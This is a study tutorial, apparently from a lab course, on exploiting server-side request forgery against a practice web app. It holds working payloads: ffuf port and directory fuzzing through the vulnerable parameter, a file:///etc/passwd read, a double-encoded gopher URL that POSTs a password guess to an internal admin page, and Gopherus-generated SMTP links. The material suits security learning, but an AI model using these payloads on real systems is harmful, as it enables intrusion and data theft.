# Server-side Request Forgery

Occurs when a web app fetches additional resources from a remote location based on user-supplied data, such as URL.

The server fetches remote resources based on user input - the attacker coerces the server into making requests to arbitrary URLs supplied by the attacker.

**Identifying SSRF**
Looking at a web app example which has a functionality to schedule appointments.

We see the request on Burp and see that the `POST` request has a body that contains a parameter with a url as a value.

We start a listening server, and put our ip we see the request on our server.

We can **enumerate** the system, by making requests to different ports.

This process can be done with `ffuf`, by creating a list of ports that we want to test and then fuzz all open ports by filtering out responses containing the error message.

```sh
ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
```

## Exploiting SSRF

From the Lab.1 we saw that the web app was getting information from the url `dateserver.htb`.

This URL doesn't work if we try to access from our host, but we can do it through the SSRF vulnerability, and we can also conduct a directory brute-force attack using `ffuf`.

First we should determine the response when we access a non-existing page, such as:

```sh
dateserver=http://dateserver.htb/invalid&date=2024-01-01
```

From the response we see that the default Apache 404 response, and we need to filter that out `Server at dateserver.htb Port 80`.

```sh
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
```

Via this command we can brute-force and find any additional internal endpoint that we can access through the SSRF vulnerability.

## Local File Inclusion (LFI)
Via SSRF we can manipulate the URL and read local files from the file system, using the `file://` URL scheme, such as:

```sh
dateserver=file:///etc/passwd
```

## The gopher Protocol
Until now we were restricted to `GET` requests, but however, there are cases when we need to use the `POST` request. 

The problem is that we can't send a `POST` request with the `http://` URL scheme.

*Example*
We find an internal endpoint `/admin.php` and the response tells as that we need to provide a password on the `adminpw` POST parameter, and now we can't send that using the `http://` URL scheme.

Let's assume that we want to try some weak passwords, such as `admin` via the following `POST` request:

```http
POST /admin.php HTTP/1.1
Host: dateserver.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin
```

**Constructing gopher**
And now we need to **construct a valid gopher URL** from this. Especially we need to encode **spaces** - `%20` and **newlines** `%0D%0A`. 

Then we need to prefix the data with the URL scheme, the target host and port, and an underscore:

```URL
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```

Now the bytes are sent to the target when the app processes this URL, the internal web server accepts it and responds. 

However, since we are sending our URL within the HTTP Post parameter `dateserver` which is a URL-encoded, we need to encode the entire URL again.

```sh
POST /index.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 265
Content-Type: application/x-www-form-urlencoded

dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
```

We can also use the `gopher` protocol to interact not just with the HTTP servers.

For example we identify that TCP port 25 is open locally, which is a standard port for SMTP servers.

We can also use tools such as `Gopherus` and generate proper URLs.

```sh
python3 gopherus.py --exploit smtp

  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

                author: $_SpyD3r_$


Give Details to send mail: 

Mail from :  attacker@academy.htb
Mail To :  victim@academy.htb
Subject :  HelloWorld
Message :  Hello from SSRF!

Your gopher link is ready to send Mail: 

gopher://127.0.0.1:25/_MAIL%20FROM:attacker%40academy.htb%0ARCPT%20To:victim%40academy.htb%0ADATA%0AFrom:attacker%40academy.htb%0ASubject:HelloWorld%0AMessage:Hello%20from%20SSRF%21%0A.

-----------Made-by-SpyD3r-----------
```

